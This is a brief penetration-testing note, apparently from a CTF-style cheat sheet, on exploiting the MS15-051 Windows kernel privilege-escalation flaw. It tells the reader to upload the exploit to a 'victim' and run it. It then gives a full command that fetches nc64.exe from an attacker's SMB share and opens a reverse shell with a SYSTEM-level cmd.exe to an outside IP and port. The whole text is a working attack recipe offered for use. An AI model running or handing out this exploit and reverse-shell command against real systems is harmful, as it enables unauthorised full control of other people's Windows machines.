# MS15-051 Client Copy Image
Source: https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip

So you ran Sherlock and found that the machine appears to be vulnerable. Hurray!

1) Make sure to download the right architecture (32/64bit) for exploit.
2) Upload file to victim and run command as System
3) Get reverse shell using smb file share 
```cmd
MS15-051x64.exe "\\10.10.14.32\a\nc64.exe 10.10.14.32 7778 -e cmd.exe" 
```
